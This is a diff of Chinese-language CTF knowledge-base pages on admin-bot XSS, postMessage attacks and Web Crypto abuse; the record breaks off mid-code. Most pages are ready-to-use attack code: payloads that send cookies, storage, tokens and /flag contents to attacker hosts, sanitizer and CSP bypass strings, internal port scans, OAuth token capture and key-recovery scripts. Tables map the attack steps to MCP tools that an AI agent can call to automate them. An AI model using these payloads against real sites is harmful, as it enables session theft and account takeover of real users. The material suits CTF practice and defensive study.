@@ -8281,241 +8281,191 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # Admin Bot / XSS 实战
 
-## 核心模型
+Admin Bot 本质是一个带高权限状态的浏览器。`alert(1)` 只是入口，真正的目标是拿到 bot 才能访问的同源数据、前端状态、token、内部面板或 flag。
 
-CTF admin bot 本质：**一个 headless 浏览器，带着高权限 cookie/localStorage 访问你提供的 URL**。目标不是 `alert(1)`，而是通过允许的渠道把 flag/sensitive data 外带出来。
+## 输入信号
 
-## 外带通道
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| 有 `/report`、`/submit`、`/visit` 让 bot 访问 URL | 枚举提交参数、等待时间、可访问协议 | bot 访问 listener，带 HeadlessChrome UA | 只做服务端 URL 抓取，不执行 JS |
+| 反射/存储 HTML 注入 | 先测 parser 与 sanitizer，再测外带通道 | payload 在 bot 环境触发 listener | 用户浏览器触发，bot 不触发 |
+| Cookie 为 HttpOnly | 走同源 fetch 读 `/flag`、`/api/me`、`/admin` | fetch 响应可外带 | CORS/Origin/CSRF 阻断同源状态 |
+| token 在 localStorage/sessionStorage | 注入运行时快照 | JWT/access_token 可重放 | token 只用于 UI，API 依赖 cookie |
+| CSP 存在 | 按 `connect-src/img-src/form-action/script-src` 路由 | 至少一个外带通道被允许 | 所有外链被拦，转 same-origin sink |
+| bot 可能有内网视角 | 端口/路径时间差探测 | 127.0.0.1 或内网服务响应差异 | bot 网络与公网一致 |
 
-```javascript
-// 按 CSP 适配选择外带方式:
-// 优先级: fetch > image > form > window.location > DNS
+## 工作流
 
-// 通道 1: fetch (需 connect-src 允许目标域或 *)
-fetch('https://attacker.com/s?' + document.cookie)
-fetch('https://webhook.site/YOUR-UUID?s=' + btoa(document.cookie))
-
-// 通道 2: Image beacon (img-src 允许)
-new Image().src = 'https://attacker.com/x?' + document.cookie
-
-// 通道 3: Form submit (form-action 允许)
-var f = document.createElement('form'); f.method='POST';
-f.action = 'https://attacker.com/collect';
-var i = document.createElement('input'); i.name='d'; i.value=document.cookie;
-f.appendChild(i); document.body.appendChild(f); f.submit();
-
-// 通道 4: window.location (无限制 — 但会跳走)
-window.location = 'https://attacker.com/' + document.cookie
-
-// 通道 5: DNS (最可靠, 绕过几乎所有 CSP)
-new Image().src = 'https://' + btoa(document.cookie).slice(0,60) + '.attacker.com/x'
-
-// 通道 6: WebSocket (connect-src ws:)
-var ws = new WebSocket('wss://attacker.com/leak');
-ws.onopen = function() { ws.send(document.cookie); };
+```text
+确认 bot 会执行 JS
+  → 读取 CSP/cookie/storage/API baseline
+  → 选择外带通道或同源读取
+  → 构造最短 payload
+  → 提交给 bot 并等待 listener
+  → 按响应推进 JWT、CSRF、内网或 postMessage 链
 ```
 
-## CSP 绕过速查
+## 0. 判定矩阵
 
-```javascript
-// 给定 CSP 头，选择对应的绕过 payload:
+| 约束 | 首选路线 | 备选路线 |
+|---|---|---|
+| `connect-src` 允许外域 | `fetch/sendBeacon/WebSocket` | image/form |
+| 只允许 `img-src` | image beacon、DNS label | 同源缓存写入后读 |
+| 只允许 `form-action` | 隐藏表单 POST | `window.name` 中转 |
+| `script-src` 禁 inline | SVG/MathML/gadget/DOM clobbering | 存储型页面二跳 |
+| Cookie HttpOnly | 同源 API 读取后外带响应 | CSRF 动作 + 状态差分 |
+| 无外带域 | same-origin 写入可读位置 | 把 flag 放入 profile/comment/log 再读 |
 
-// script-src 'none' / no 'unsafe-inline'
-// → 需要 script gadget 或 DOM clobbering
-// (无通用绕过，需针对目标库找 gadget)
-
-// script-src 'self' 'unsafe-inline'
-// → 直接注入 <script>alert(1)</script>
-
-// object-src 'none'
-// → 不能用 <object>/<embed>/<applet>
-
-// img-src * → Image beacon 外带
-// connect-src * → fetch/WS 外带
-// form-action * → form submit 外带
-
-// default-src 'none' + specific allows
-// → DNS exfil via <img> or <link> 一般是最后手段
-```
-
-## DOM Clobbering
-
-```javascript
-// 当 script 不可控但 HTML 注入存在时：
-// 通过 HTML 注入创建假元素，影响 JS 中全局变量的值
-
-// 目标 JS: if (window.config.debug) { ... }
-// 注入:
-// <a id="config" name="debug" href="x">
-
-// 目标 JS: if (document.getElementById('isAdmin').value === 'true')
-// 注入:
-// <input id="isAdmin" value="true">
-
-// 通用探测:
-var clobbered = ['config', 'debug', 'isAdmin', 'isPremium', 'role', 'perm']
-for (var k of clobbered) {
-    if (typeof window[k] !== 'undefined') { /* 可 clobber */ }
-}
-```
-
-## SVG/MathML 逃逸沙箱
-
-```xml
-<!-- 如果 HTML 标签被过滤，尝试 SVG namespace -->
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script>/* 可能绕过仅匹配 HTML namespace 的过滤器 */</script>
-  <animate onbegin="fetch('https://attacker.com/'+document.cookie)" attributeName="x" dur="1s"/>
-  <set onbegin="fetch('https://attacker.com/'+document.cookie)" attributeName="x" to="1"/>
-</svg>
-
-<!-- MathML 类似 -->
-<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('https://attacker.com/'+document.cookie)>-->
-```
-
-## Sanitizer 绕过
-
-```javascript
-// DOMPurify 绕过探测 (version specific)
-// payload 模板库:
-
-// Mutation XSS (innerHTML → namespace confusion)
-"<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
-
-// 嵌套 template 绕过
-"<template><slot name=x><img src=x onerror=alert(1)></slot></template>"
-
-// 利用原型链
-"<a id=x><table><a id=x>"
-
-// 利用 CDATA 边界
-"<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>"
-
-// 如果 sanitizer 版本可识别 → 查已知 CVE
-```
-
-## Admin Bot 交互脚本
+## 1. Bot 提交器
 
 ```python
-# bot_interact.py — 与 admin bot 交互的请求模板
+#!/usr/bin/env python3
+import argparse
+import json
 import requests
 
-BOT_SUBMIT_URL = "https://target.com/report"  # 提交 URL 让 bot 访问
+def submit(url, target, mode):
+    if mode == "json":
+        return requests.post(url, json={"url": target}, timeout=10)
+    if mode == "graphql":
+        return requests.post(url, json={"query": f'mutation{{visit(url:"{target}"){{ok}}}}'}, timeout=10)
+    return requests.post(url, data={"url": target}, timeout=10)
 
-def send_to_bot(url: str) -> dict:
-    """提交 URL 给 admin bot 访问"""
-    # 典型格式 1: form POST
-    r = requests.post(BOT_SUBMIT_URL, data={"url": url})
-    # 典型格式 2: JSON
-    # r = requests.post(BOT_SUBMIT_URL, json={"url": url})
-    # 典型格式 3: GraphQL
-    # r = requests.post(BOT_SUBMIT_URL, json={
-    #     "query": 'mutation { visitUrl(url: "' + url + '") { success } }'
-    # })
-    return {"status": r.status_code, "body": r.text}
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--submit-url", required=True)
+    ap.add_argument("--target-url", required=True)
+    ap.add_argument("--mode", choices=["form", "json", "graphql"], default="form")
+    args = ap.parse_args()
+    r = submit(args.submit_url, args.target_url, args.mode)
+    print(json.dumps({"status": r.status_code, "location": r.headers.get("Location", ""), "body": r.text[:500]}, ensure_ascii=False))
 
-def build_exploit_url(payload_js: str, callback_url: str) -> str:
-    """构造包含 XSS payload 的 URL"""
-    # 方式 1: 反射型 XSS
-    return f"https://target.com/search?q=<img src=x onerror='{payload_js}'>"
-
-    # 方式 2: 存储型 XSS (payload 已存在页面上)
-    # return f"https://target.com/profile/attacker"
-
-    # 方式 3: 直接可控页面
-    # return f"https://attacker.com/exploit.html"
+if __name__ == "__main__":
+    main()
 ```
 
-## 通过 admin bot 打内网
+成功样本：提交后 listener 收到 bot 访问，或目标队列返回 visit id。失败样本：只返回 URL syntax error、协议被过滤、队列存在但 listener 没有访问。
+
+## 2. 外带通道选择器
 
 ```javascript
-// admin bot 可能运行在内网环境
-// XSS payload 扫描内网:
-async function scan_internal() {
-    let results = [];
-    for (let port of [80, 443, 8080, 8443, 3000, 5000, 6379, 9200]) {
-        try {
-            let r = await fetch(`http://127.0.0.1:${port}/`, {mode:'no-cors'});
-            results.push(`port ${port}: open`);
-        } catch(e) {}
+(() => {
+  const L = "https://listener.example/collect";
+  const pack = async () => {
+    let same = "";
+    try {
+      same = await fetch("/flag", {credentials: "include"}).then(r => r.text());
+    } catch (e) {
+      same = String(e);
     }
-    fetch('https://attacker.com/r?' + JSON.stringify(results));
-}
+    return btoa(unescape(encodeURIComponent(JSON.stringify({
+      href: location.href,
+      cookie: document.cookie,
+      local: {...localStorage},
+      session: {...sessionStorage},
+      same: same.slice(0, 1200)
+    }))).replace(/=+$/, "");
+  };
+  pack().then(d => {
+    navigator.sendBeacon && navigator.sendBeacon(L, d);
+    fetch(L + "?f=" + d, {mode: "no-cors"}).catch(() => {});
+    (new Image()).src = L + "/i/" + d.slice(0, 1800);
+    const f = document.createElement("form");
+    f.method = "POST"; f.action = L; f.target = "_self";
+    const i = document.createElement("input"); i.name = "d"; i.value = d;
+    f.appendChild(i); document.body.appendChild(f);
+    setTimeout(() => f.submit(), 50);
+  });
+})();
 ```
+
+判定：
+
+| listener 现象 | 解释 |
+|---|---|
+| fetch/sendBeacon 到达 | `connect-src` 可用，继续读同源 API |
+| 只有 image 到达 | `img-src` 可用，分片外带 |
+| 只有 form 到达 | `form-action` 可用，用 POST 带长响应 |
+| 都不到达 | CSP/网络阻断，转同源写入或 DNS label |
+
+## 3. CSP 与 gadget 选择
+
+| CSP 形态 | Payload 族 |
+|---|---|
+| `script-src 'unsafe-inline'` | 直接 `<script>` 或事件处理器 |
+| `script-src 'self'` | 找同源 JSONP、Angular/React/Vue gadget、上传 JS |
+| `img-src *` | image beacon 外带 |
+| `connect-src *` | fetch/WebSocket 外带 |
+| `base-uri` 缺失 | `<base href>` 改相对资源加载 |
+| `trusted-types` 存在 | 找已有 policy 或 DOM sink 二跳 |
+
+```html
+<svg><animate attributeName="x" onbegin="fetch('/flag',{credentials:'include'}).then(r=>r.text()).then(t=>location='https://listener.example/?d='+btoa(t))"></animate></svg>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror="fetch('/flag').then(r=>r.text()).then(t=>new Image().src='https://listener.example/i?d='+btoa(t))">-->
+```
+
+## 4. DOM Clobbering 与同源动作
+
+当脚本不可直接执行但 HTML 可注入时，优先影响目标代码已经读取的全局变量、form、anchor、config。
+
+```html
+<form id=config><input name=isAdmin value=true><input name=apiBase value=/admin></form>
+<a id=redirect_uri href="javascript:fetch('/flag').then(r=>r.text()).then(t=>location='https://listener.example/?d='+btoa(t))"></a>
+<iframe name=csrf_token srcdoc="<input id=x value=owned>"></iframe>
+```
+
+## 5. 内网与同源探测
+
+```javascript
+async function probe() {
+  const ports = [80, 443, 3000, 5000, 6379, 8000, 8080, 9222];
+  const out = [];
+  for (const p of ports) {
+    const t0 = performance.now();
+    try {
+      await fetch(`http://127.0.0.1:${p}/`, {mode: "no-cors", cache: "no-store"});
+      out.push({port: p, dt: Math.round(performance.now() - t0), hit: true});
+    } catch (e) {
+      out.push({port: p, dt: Math.round(performance.now() - t0), hit: false});
+    }
+  }
+  new Image().src = "https://listener.example/p?" + btoa(JSON.stringify(out));
+}
+probe();
+```
+
+成功样本：端口时间差稳定、同源 API 响应被外带、flag/token 到达 listener。失败样本：listener 无访问、只有普通用户访问、bot 不执行脚本、同源 fetch body 为空。
 
 ## 攻击链
 
-```
-XSS → cookie 窃取 → Session hijack → Account Takeover
-XSS → CSRF token 读取 → 完整 CSRF → 改密码/转账
-XSS → localStorage → JWT/Access Token 窃取 → API 滥用
-XSS → admin bot → 内网扫描 → SSRF → 内网 RCE
-XSS → DOM Clobbering → 修改 config.isAdmin → 前端鉴权绕过
-XSS → CSP bypass via image → 外带 flag
-XSS → SVG → CSP script-src bypass (某些浏览器) → 任意 JS 执行
-XSS → Sanitizer bypass → Mutation XSS → 持久化存储 → 所有用户感染
-XSS → WebSocket → 注入消息 → 服务端命令执行
-XSS → Service Worker → 持久化中间人 → 全站劫持
-
-## Browser Parser Differentials (2024+)
-
-### Streamed vs Non-Streamed HTML
-
-```html
-<!-- Chrome 流式解析 vs data: URI 一次性解析 → 不同的 DOM 树 -->
-<!-- ISO-2022-JP charset 切换使 CSP meta 标签只在一种模式下可见 -->
-
-<meta http-equiv="Content-Type" content="text/html; charset=iso-2022-jp">
-<script>
-  // 流式模式下: 浏览器已解析并应用了 CSP meta
-  // data: 模式下: CSP meta 还未出现 → 可执行 inline script
-</script>
+```text
+XSS 注入
+  → bot 执行 JS
+  → 读取同源 /flag 或前端 token
+  → 选择可用外带通道
+  → listener 收到响应
+  → JWT 重放 / CSRF 动作 / 内网探测 / postMessage 二跳
 ```
 
-### qs vs URLSearchParams Parser Differential
+## Evidence
 
-```javascript
-// Node.js qs: ]= 是键值分隔符 (优先级高于 =)
-// 浏览器 URLSearchParams: ]= 只是普通字符
-// → URL: ?a]=x&a=y 在服务器上 → a=["x","y"]，浏览器认为是 a]="x", a="y"
-
-// XSS via parser differential:
-// Server sees: redirect_uri=https://safe.com
-// Browser sees redirect_uri]=https: → safe.com 变成 key
-```
-
-## Sanitizer 绕过 (DOMPurify 2024+)
-
-```html
-<!-- Mutation XSS — 过滤后 DOM 和渲染后 DOM 不同 -->
-<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('/flag').then(r=>r.text()).then(t=>location='//attacker.com/'+btoa(t))>-->
-
-<!-- Namespace confusion — SVG 内的 HTML 被不同解析 -->
-<svg><foreignObject><div id="x"></div></foreignObject></svg>
-```
-
-### 自动化 Sanitizer Fuzz
-
-```python
-# Dom-Explorer — 系统化发现 parser 差异
-# npm install dom-explorer
-# 比较: sanitizer 输出的 DOM vs 浏览器渲染的 DOM
-# 找到两者不一致 → 潜在 mutation XSS
-```
-```
-
-## 证据
-
-记录: 注入点、完整 payload、CSP 头、sanitizer 版本、bot 类型(headless chrome/puppeteer/playwright)、外带通道、接收到的数据。
+| 项 | 记录内容 |
+|---|---|
+| bot 触发 | 提交 URL、队列响应、listener 时间、UA、IP、Referer |
+| 注入点 | URL、参数、payload、渲染上下文、sanitizer 输出 |
+| CSP 路由 | CSP header/meta、可用外带通道、失败通道 |
+| 同源读取 | 被读取路径、状态码、响应 hash、关键字段 |
+| 成功样本 | flag/token/admin 数据到达 listener，或同源动作产生状态变化 |
+| 失败样本 | CSP 拦截、bot 不执行 JS、cookie 不随请求、响应 hash 固定拒绝 |
+| 下一跳 | token 转 JWT 07；postMessage 转本目录 postmessage；内网转 SSRF/infra |
 
 ## MCP 工具映射
 
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| XSS 入口探测 | `http_probe` | HTTP GET 探测 XSS 注入点 |
-| 知识检索 | `kb_router` | 按 XSS 攻击信号搜索知识库 |
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 入口探测 | `http_probe` | 探测注入点、CSP、bot 提交接口 |
+| 浏览器打点 | `jshook` | 注入 fetch/XHR/storage hook |
+| 知识路由 | `kb_router` | 按 XSS、CSP、admin bot、DOM clobbering 信号搜索 |
 
 
 ---
@@ -9061,156 +9011,174 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # PostMessage / 跨域通信攻击
 
-## Null Origin 沙箱绕过
+postMessage 攻击不是盲发 JSON，而是还原接收端的四件事：谁能发、发什么 schema、触发什么动作、响应发给谁。
+
+## 输入信号
+
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| JS 中有 `addEventListener("message"` | 抽 handler、origin 检查和 data 分支 | 可控 origin/data 进入敏感分支 | handler 只记录日志 |
+| `postMessage(..., "*")` | 找 token/flag/redirect 回包 | opener/iframe 收到敏感数据 | 回包只有 public 状态 |
+| 检查 `event.origin.includes/endsWith` | 构造 sibling/eTLD/null origin | 非目标 origin 通过 | 精确等值匹配 |
+| 检查 `event.source` | opener/iframe 导航 race | source 引用保留但内容被替换 | 每次重新验证 origin |
+| data 进入 merge/render/eval | schema fuzz + PP/XSS | `isAdmin`、redirect、HTML sink 被污染 | schema validator 拒绝 |
+
+## 工作流
+
+```text
+定位 message handler
+  → 抽 origin/source/schema/action
+  → 建立 iframe/opener harness
+  → 批量发送 origin 与 data 变体
+  → 捕获回包、DOM 变化、网络请求
+  → 按命中动作转 OAuth/JWT/XSS/PP 链
+```
+
+## 0. 判定矩阵
+
+| 检查方式 | Payload | 命中样本 | 失败样本 |
+|---|---|---|---|
+| `origin === trusted` | 子域、协议降级、punycode | 非 trusted 进入 handler | 固定拒绝 |
+| `origin.includes("target.com")` | `https://target.com.attacker.test` | 通过 includes | 使用 URL parser |
+| `origin === "null"` 或未处理 null | sandbox iframe / data URL | null origin 可执行动作 | null 被拒 |
+| `source === iframe.contentWindow` | 导航 iframe 到 attacker | source 仍通过 | 导航后重新绑定 |
+| `data.type/action` | admin/getFlag/token/export | 返回敏感字段 | 只返回 ack |
+| deep merge | `__proto__`, `constructor.prototype` | 全局对象被污染 | structured clone 后被净化或 schema 拒绝 |
+
+## 1. Handler 提取
+
+```javascript
+(() => {
+  const oldAdd = EventTarget.prototype.addEventListener;
+  EventTarget.prototype.addEventListener = function(type, fn, opts) {
+    if (type === "message") {
+      console.log("[pm-handler]", location.href, fn && fn.toString().slice(0, 1200));
+      debugger;
+    }
+    return oldAdd.call(this, type, fn, opts);
+  };
+  window.addEventListener("message", e => {
+    console.log("[pm-observe]", {
+      origin: e.origin,
+      source: !!e.source,
+      data: e.data
+    });
+  }, true);
+})();
+```
+
+成功样本：console 里出现 handler 源码、分支关键字、`postMessage` 回包。失败样本：页面无 handler 或 handler 延迟加载，需要导航后再注入 hook。
+
+## 2. 批量 payload 发送器
 
 ```html
-<!-- null_origin_bypass.html — 托管在 attacker.com -->
-<!-- 目标页面: onmessage 检查 if (e.origin === window.origin) -->
-<iframe sandbox="allow-scripts allow-popups"
-  srcdoc="
-    <script>
-      // sandbox 属性 → window.origin = null
-      // iframe 内 origin = null
-      // e.origin === null === window.origin → 通过!
-      window.parent.postMessage({
-        type: 'admin_command',
-        payload: 'delete_all',
-        token: 'stolen_from_XSS'
-      }, '*');
-    </script>
-  ">
-</iframe>
-
+<!doctype html>
+<meta charset="utf-8">
+<iframe id="t" src="https://target.example/page.html"></iframe>
 <script>
-  // 接收响应
-  window.addEventListener('message', function(e) {
-    if (e.data && e.data.success) {
-      fetch('https://attacker.com/log?d=' + btoa(JSON.stringify(e.data)));
-    }
+const payloads = [
+  {type: "ping"},
+  {type: "getFlag"},
+  {type: "admin", cmd: "export"},
+  {action: "oauth", access_token: "probe"},
+  {"__proto__": {isAdmin: true}},
+  {constructor: {prototype: {role: "admin"}}},
+  {type: "render", html: "<img src=x onerror=fetch('/flag').then(r=>r.text()).then(t=>parent.postMessage({leak:t},'*'))>"}
+];
+window.addEventListener("message", e => {
+  fetch("https://listener.example/pm", {
+    method: "POST",
+    mode: "no-cors",
+    body: JSON.stringify({origin: e.origin, data: e.data})
   });
+});
+t.onload = () => {
+  for (const p of payloads) {
+    t.contentWindow.postMessage(p, "*");
+  }
+};
 </script>
 ```
 
-## PostMessage Origin Fuzzer
-
-```python
-# postmessage_fuzz.py — 探测 postMessage listener
-from selenium import webdriver
-import json
-
-POSTMESSAGE_PROBES = [
-    # Origin 变体
-    {"origin": "null"},
-    {"origin": "file://"},
-    {"origin": "https://target.com.evil.com"},
-    {"origin": "http://target.com"},  # https → http 降级
-    {"origin": ""},
-    {"origin": "*"},
-    # Payload 变体
-    {"data": {"__proto__": {"isAdmin": True}}},   # PP via postMessage
-    {"data": {"constructor": {"prototype": {"role": "admin"}}}},
-    {"data": {"type": "admin", "cmd": "getFlag"}},  # 命令注入
-    {"data": {"token": "<img src=x onerror=alert(1)>"}},  # XSS via render
-]
-
-def fuzz_postmessage(target_page: str):
-    """自动对目标页面发送各种 postMessage 组合"""
-    driver = webdriver.Chrome()
-    driver.get(target_page)
-    for probe in POSTMESSAGE_PROBES:
-        script = f"""
-        window.postMessage({json.dumps(probe['data'])},
-            '{probe.get('origin', '*')}');
-        """
-        driver.execute_script(script)
-        # 检测异常行为 (DOM 变化、网络请求、console log)
-```
-
-## event.source Hijacking
+## 3. null origin 与 source race
 
 ```html
-<!-- event_source_hijack.html -->
-<!-- 场景: 父页面打开 trusted.html in iframe
-     父: trustedWindow = window.open('trusted.html')
-     trusted.html → onmessage → if (e.source === opener) → 信任
-     攻击者导航 trusted iframe 到自己的页面 → e.source still passes -->
-
+<iframe sandbox="allow-scripts allow-forms allow-popups" srcdoc="
 <script>
-// 打开目标页面
-var win = window.open('https://target.com/trusted_page.html');
-
-// 等待加载完成 → 导航到我们的页面（保留 reference）
-setTimeout(function() {
-    win.location = 'https://attacker.com/evil.html';
-}, 3000);
-
-// 从 evil.html postMessage → e.source 仍然是原来 trusted 页面的 window
-// 但内容已经是我们的了
-setTimeout(function() {
-    win.postMessage({action: 'readSensitiveData'}, '*');
-}, 5000);
+parent.postMessage({type:'getFlag', reply:'parent'}, '*');
 </script>
+"></iframe>
 ```
 
-## OAuth Token 窃取 via postMessage
-
 ```html
-<!-- 场景: OAuth proxy 页面在 opener.postMessage(token, '*') 中泄露 token -->
 <script>
-// Step 1: 诱导受害者打开 OAuth proxy
-// <a href="https://target.com/oauth/proxy?redirect_uri=https://attacker.com/callback">
-// Step 2: proxy 页面包含:
-//   window.opener.postMessage({access_token: 'xxx'}, '*');
-// Step 3: 我们的 callback 页面接收:
-window.addEventListener('message', function(e) {
-    if (e.data.access_token) {
-        fetch('https://attacker.com/steal_token', {
-            method: 'POST',
-            body: JSON.stringify({token: e.data.access_token, origin: e.origin})
-        });
-    }
+const w = window.open("https://target.example/trusted.html");
+setTimeout(() => { w.location = "https://attacker.example/relay.html"; }, 800);
+setTimeout(() => { w.postMessage({type:"export", target:"admin"}, "*"); }, 1600);
+window.addEventListener("message", e => {
+  navigator.sendBeacon("https://listener.example/source", JSON.stringify({origin:e.origin, data:e.data}));
 });
 </script>
 ```
 
-## Structured Clone 算法利用
+判定：如果 handler 只保存 `source` 引用，导航后仍可能被当作 trusted window；如果每次同时校验 `origin` 与 action schema，这条线通常终止。
+
+## 4. OAuth / token 回包
+
+| 场景 | 动作 | 成功样本 |
+|---|---|---|
+| callback 页面 `opener.postMessage(token, "*")` | attacker opener 接收 | access_token/id_token 到达 listener |
+| iframe silent refresh | 嵌入 OAuth iframe，监听回包 | refresh 结果外带 |
+| redirect proxy | 改 `redirect_uri/state` 与 opener | code/token 发给 attacker window |
 
 ```javascript
-// postMessage 使用 structured clone → 保留某些特殊对象
-// Blob, File, RegExp (带 lastIndex) → 可在接收端产生副作用
-
-// 攻击: 发送带毒 lastIndex 的 RegExp
-var evilRegex = /a/g;
-evilRegex.lastIndex = 999999;  // 下一个 exec 从 999999 开始
-
-targetWindow.postMessage({
-    type: 'validate',
-    pattern: evilRegex   // 如果接收端调用 pattern.test(input) → 失败
-}, '*');
+window.addEventListener("message", e => {
+  if (JSON.stringify(e.data).match(/access_token|id_token|refresh_token|code/)) {
+    fetch("https://listener.example/oauth", {method:"POST", mode:"no-cors", body:JSON.stringify({origin:e.origin, data:e.data})});
+  }
+});
 ```
+
+## 5. structured clone 与 PP
+
+```javascript
+const evil = /flag/g;
+evil.lastIndex = 999999;
+target.postMessage({type:"validate", pattern: evil}, "*");
+target.postMessage({"__proto__": {isAdmin: true, apiBase: "/admin"}}, "*");
+target.postMessage({constructor: {prototype: {role: "admin"}}}, "*");
+```
+
+成功样本：接收端正则结果、全局 config、权限字段或 DOM 渲染发生变化。失败样本：`structuredClone` 后字段被 schema 校验剔除，或 action 白名单不含敏感动作。
 
 ## 攻击链
 
-```
-PostMessage null origin → sandbox iframe → 绕过 origin 检查 → 执行特权命令
-PostMessage → event.source hijacking → 偷取敏感数据
-PostMessage → OAuth token leak → 窃取 access_token → Account Takeover
-PostMessage → prototype pollution via data object → isAdmin=true → 提权
-PostMessage → XSS via data render → DOM injection → cookie steal
+```text
+handler 定位
+  → origin/source/schema 差分
+  → null origin / source race / wildcard 回包
+  → token 或敏感动作命中
+  → 转 OAuth/JWT/XSS/PP 下一跳
 ```
 
 ## Evidence
 
-记录: postMessage 发送的 origin/data、接收端 handler 代码、成功绕过的证明、OAuth token 字段与响应片段
+| 项 | 记录内容 |
+|---|---|
+| handler | 文件 URL、函数片段、origin/source 检查、action 分支 |
+| harness | iframe/opener/null-origin 构造、发送 payload、目标 URL |
+| oracle | 回包 data、DOM 变化、网络请求、listener 日志 |
+| 成功样本 | token/flag/admin 数据回包，或敏感 action 被执行 |
+| 失败样本 | origin 精确拒绝、schema reject、source mismatch、同一 ack |
+| 下一跳 | OAuth token 转 `20-oauth-deep`；JWT 转 `02-auth/jwt`；HTML sink 转 admin-bot-xss |
 
 ## MCP 工具映射
 
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| postMessage 端点探测 | `http_probe` | HTTP GET 探测 postMessage 监听端点 |
-| 知识检索 | `kb_router` | 按 postMessage 攻击信号搜索知识库 |
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| handler 探测 | `jshook` | hook addEventListener/postMessage |
+| 页面探测 | `http_probe` | 抓 JS bundle 与 iframe/opener 页面 |
+| 知识路由 | `kb_router` | 按 postMessage、OAuth token、prototype pollution 搜索 |
 
 
 ---
@@ -9223,155 +9191,212 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # Web Crypto API 滥用
 
-## Math.random() PRNG 破解 (V8 XorShift128+)
+Web Crypto 题目优先看“谁生成 key、谁持有 key、key_ops 允许什么、nonce/iv 是否复用、密文 oracle 是否可控”。标准 AES/RSA 本身通常不是突破口，突破口在前端封装和状态管理。
 
-```python
-# 如果密钥由 Math.random() 生成 → V8 XorShift128+ 可逆推
-# 需要约 25 个连续 random 输出 → Z3 solver 恢复状态
+## 输入信号
 
-from z3 import *
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| `crypto.subtle.importKey/generateKey/deriveKey` | hook 参数与返回 key handle | JWK/raw/passphrase/usage 可见 | key 来自硬件或服务端不可见 |
+| `CryptoJS.AES.encrypt` | 测 ECB/CBC/CTR、salt、passphrase | 固定明文产生可识别模式 | 每次随机 IV 且 key 不可控 |
+| `Math.random()` 生成 token/key/nonce | 收集连续输出和种子线索 | token 可预测或 nonce 重复 | 使用 `crypto.getRandomValues` |
+| JWK 中 `extractable/key_ops` 可控 | 改 key_ops/import 参数 | 非导出 key 被 wrap/decrypt/export | 浏览器拒绝 usage 组合 |
+| AES-GCM/CTR nonce 可控 | 重放相同 nonce 明文对 | keystream/认证差异可利用 | nonce 服务端生成且唯一 |
+| JWE/RSA modulus 泄露 | 提取 `n/e/kid/x5c` | 弱 modulus 或公私钥混用 | modulus 强且只用于公钥加密 |
 
-def crack_math_random(observed_values: list[float]) -> list[int]:
-    """从 Math.random() 输出恢复 V8 PRNG 状态"""
-    # Math.random() = (state0 + state1) / 2^64
-    # XorShift128+: state1 ^= state1 << 23; state = (state1, state0, state1 >> 17, state1 >> 26)
+## 工作流
 
-    s = Solver()
-    state0 = BitVec('state0', 64)
-    state1 = BitVec('state1', 64)
-
-    states = [state0, state1]
-    recovered = []
-
-    for obs in observed_values:
-        # 解: obs * 2^64 ≈ state0 + state1
-        target = int(obs * (2**64))
-        s.add(URem(states[-2] + states[-1], 2**64) == target)
-
-        if s.check() == sat:
-            m = s.model()
-            s0, s1 = m[state0].as_long(), m[state1].as_long()
-            recovered = [s0, s1]
-            break
-
-    return recovered
-
-# 拿到状态后，预测所有后续 random → 重算密钥
-# 在 TSG CTF 2024 中，用此方法恢复 JWT secret 和 encryption key
+```text
+定位 crypto 调用
+  → hook import/generate/derive/encrypt/decrypt/sign/verify
+  → 抽 key 参数、usage、iv/nonce、明密文样本
+  → 跑模式/PRNG/JWK/nonce 差分
+  → 复现加解密或签名 oracle
+  → 转 JWT、签名、支付或客户端状态链
 ```
 
-## 弱 RSA 密钥分解
-
-```python
-# 如果 JS 生成 RSA 时使用了可分解的 modulus
-# → 从 JS bundle 提取 n → FactorDB 分解 → 导出私钥
-
-import requests, base64
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
-
-def recover_rsa_private(n_hex: str) -> RSA.RsaKey:
-    """从弱 n 恢复 RSA 私钥"""
-    n = int(n_hex, 16)
-
-    # Step 1: FactorDB 查询
-    r = requests.get(f"http://factordb.com/api", params={"query": str(n)})
-    factors = r.json().get("factors", [])
-    if len(factors) < 2:
-        return None
-
-    p = int(factors[0][0])
-    q = int(factors[1][0])
-    e = 65537  # 常见 e
-
-    # Step 2: 计算私钥
-    phi = (p - 1) * (q - 1)
-    d = pow(e, -1, phi)
-
-    # Step 3: 构造 RSA 私钥
-    key = RSA.construct((n, e, d, p, q))
-    return key
-
-# 用私钥解密 JWE 或签名 JWT
-def forge_jwe_token(jwe_token: str, n_hex: str) -> dict:
-    key = recover_rsa_private(n_hex)
-    from jose import jwe
-    payload = jwe.decrypt(jwe_token, key.export_key())
-    return json.loads(payload)
-```
-
-## extractable: false 绕过
+## 0. 运行时 hook
 
 ```javascript
-// Web Crypto API: extractable: false → 不能 exportKey()
-// 但如果有 wrapKey 权限 → 可以 wrap 其他 key → 导出 wrapped key bytes
+(() => {
+  const enc = x => {
+    if (x instanceof ArrayBuffer) return Array.from(new Uint8Array(x)).map(b=>b.toString(16).padStart(2,"0")).join("");
+    if (ArrayBuffer.isView(x)) return Array.from(new Uint8Array(x.buffer, x.byteOffset, x.byteLength)).map(b=>b.toString(16).padStart(2,"0")).join("");
+    try { return JSON.stringify(x); } catch { return String(x); }
+  };
